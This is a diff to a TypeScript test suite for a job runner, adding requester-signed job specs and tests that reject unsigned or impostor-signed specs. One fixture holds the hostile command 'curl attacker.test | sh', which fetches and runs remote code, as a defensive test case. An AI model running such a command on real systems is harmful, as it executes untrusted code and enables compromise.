@@ -9,7 +9,7 @@ import {
 } from '../src/config.js';
 import type { ComputeJob } from '../src/contract.js';
 import type { ContainerHandle, ContainerRuntime } from '../src/executor.js';
-import type { JobSpecStore } from '../src/specs.js';
+import { type JobSpecStore, jobSpecMessage } from '../src/specs.js';
 import {
   type RunnerEscrowApi,
   computeTimeoutSeconds,
@@ -22,7 +22,8 @@ import {
 
 const SECRET = Keypair.random().secret();
 const RUNNER = Keypair.fromSecret(SECRET).publicKey();
-const REQUESTER = Keypair.random().publicKey();
+const REQUESTER_KEY = Keypair.random();
+const REQUESTER = REQUESTER_KEY.publicKey();
 const TOKEN = StrKey.encodeContract(Buffer.alloc(32, 5));
 const CONTRACT_ID = StrKey.encodeContract(Buffer.alloc(32, 4));
 
@@ -63,8 +64,33 @@ function createHandle(options: { logs?: string; exitCode?: number } = {}): Conta
   };
 }
 
-function createSpecStore(spec = { image: 'alpine', command: 'true' }): JobSpecStore {
-  return { get: vi.fn(async () => spec) };
+/** Signs a spec with the requester's key, as `pulserun run --spec-out` does. */
+function signedSpec(
+  job: ComputeJob,
+  spec = { image: 'alpine', command: 'true' },
+  signer = REQUESTER_KEY,
+) {
+  const signature = Buffer.from(
+    signer.sign(
+      Buffer.from(
+        jobSpecMessage({
+          jobId: job.jobId,
+          requester: signer.publicKey(),
+          image: spec.image,
+          command: spec.command,
+        }),
+        'utf8',
+      ),
+    ),
+  ).toString('base64');
+  return { ...spec, signer: signer.publicKey(), signature };
+}
+
+function createSpecStore(
+  job: ComputeJob = makeJob(),
+  spec = { image: 'alpine', command: 'true' },
+): JobSpecStore {
+  return { get: vi.fn(async () => signedSpec(job, spec)) };
 }
 
 function fakeEscrow(jobs: ComputeJob[]) {
@@ -182,6 +208,40 @@ describe('processJob', () => {
       { executor, escrow: api, specs: createSpecStore(), logger },
       900,
     );
+
+    expect(result).toBeNull();
+    expect(executor.execute).not.toHaveBeenCalled();
+    expect(submitProof).not.toHaveBeenCalled();
+  });
+
+  it('refuses a spec that its on-chain requester did not sign', async () => {
+    const { api, submitProof } = fakeEscrow([makeJob()]);
+    const executor = { execute: vi.fn() };
+    const unsigned: JobSpecStore = {
+      get: vi.fn(async () => ({ image: 'alpine', command: 'curl attacker.test | sh' })),
+    };
+
+    const result = await processJob(
+      makeJob(),
+      { executor, escrow: api, specs: unsigned, logger },
+      900,
+    );
+
+    expect(result).toBeNull();
+    expect(executor.execute).not.toHaveBeenCalled();
+    expect(submitProof).not.toHaveBeenCalled();
+    expect(logger.warn).toHaveBeenCalledWith(expect.stringContaining('not signed by requester'));
+  });
+
+  it('refuses a spec signed by an address other than the requester', async () => {
+    const { api, submitProof } = fakeEscrow([makeJob()]);
+    const executor = { execute: vi.fn() };
+    const impostor = Keypair.random();
+    const specs: JobSpecStore = {
+      get: vi.fn(async () => signedSpec(makeJob(), undefined, impostor)),
+    };
+
+    const result = await processJob(makeJob(), { executor, escrow: api, specs, logger }, 900);
 
     expect(result).toBeNull();
     expect(executor.execute).not.toHaveBeenCalled();
